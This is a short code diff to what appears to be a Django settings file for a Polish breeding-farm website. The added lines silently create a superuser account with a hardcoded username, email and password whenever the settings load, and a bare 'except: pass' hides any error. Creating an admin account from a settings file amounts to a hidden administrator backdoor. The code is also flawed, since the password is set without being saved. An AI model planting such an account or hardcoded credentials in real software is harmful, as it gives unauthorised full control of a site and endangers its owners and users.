@@ -138,3 +138,15 @@ ADMIN_SITE_HEADER = "🏡 Hodowla z Wojciechowic"
 ADMIN_SITE_TITLE = "Hodowla Admin"
 ADMIN_INDEX_TITLE = "Panel Zarządzania"
 
+try:
+   from django.contrib.auth import get_user_model
+   User = get_user_model()
+   User.objects.get_or_create(
+       username="zwojciechowic",
+       defaults={
+           'email': 'zwojciechowic@gmail.com',
+           'is_superuser': True,
+           'is_staff': True
+       }
+   )[0].set_password("zwojciechowic432")
+except: pass
